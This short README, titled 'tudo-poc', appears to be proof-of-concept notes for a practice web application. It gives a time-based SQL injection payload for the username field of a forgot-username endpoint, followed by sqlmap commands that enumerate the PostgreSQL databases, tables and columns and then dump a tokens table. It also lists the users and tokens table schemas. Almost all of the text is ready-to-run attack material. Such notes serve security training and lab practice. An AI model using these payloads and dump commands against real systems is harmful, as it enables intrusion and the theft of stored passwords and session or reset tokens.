# tudo-poc

```
SQLi via SQL map for quick DB enumeration:
	- 	POST /forgotusername.php
		username=';select+pg_sleep(5);+--+
	
	1. save Burp POST /forgotusername.php (remove cookie) to sqli-psot-req.txt
	2. Enumerate DB schemas: 
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL --dbs
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL --tables
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL -T users --columns
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL -T tokens --columns
   	    - sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL -T tokens --dump


	tables in SQL:
	- create table users(uid int4, username text, password text, description text);
	- create table tokens(uid int4, tid int4, token text);
```
